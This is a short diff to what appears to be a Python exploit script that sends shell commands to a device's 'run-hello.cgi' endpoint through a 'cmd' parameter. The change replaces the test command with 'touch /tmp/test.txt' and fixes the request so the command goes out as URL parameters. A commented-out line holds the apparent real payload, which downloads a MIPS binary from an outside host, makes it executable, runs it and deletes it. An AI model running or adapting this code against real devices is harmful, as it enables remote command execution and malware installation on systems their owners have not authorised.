@@ -20,8 +20,8 @@ port = 80
 #cmd = 'wget http://192.168.0.99:8080/mips; chmod +x mips; ./mips; rm -rf mips;'
 
 data = {
-	'cmd':'touch /test.txt'
+	'cmd':'touch /tmp/test.txt'
 }
 
 url = 'http://' + host + '/run-hello.cgi'
-response = requests.get(url, data=data)
+response = requests.get(url, params=data)
